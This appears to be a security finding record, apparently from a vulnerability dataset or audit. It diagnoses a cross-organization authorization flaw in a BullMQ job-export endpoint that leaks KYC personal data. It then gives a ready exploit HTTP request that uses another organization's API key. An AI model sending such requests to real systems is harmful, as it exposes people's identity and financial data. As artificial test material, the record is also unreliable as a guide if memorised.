diagnosis: The BullMQ job data export endpoint checks for the presence of an API key, but reads job.data (which holds sensitive KYC PII and background processing payloads) for any requested jobId without validating that the organization associated with the API key owns the job.
exploit_request:
GET /api/queue-admin/kyc-verification/jobs/job_kyc_app_847120/data HTTP/1.1
Host: bull-admin.fintech.internal:8007
X-Api-Key: org_beta_secret_token
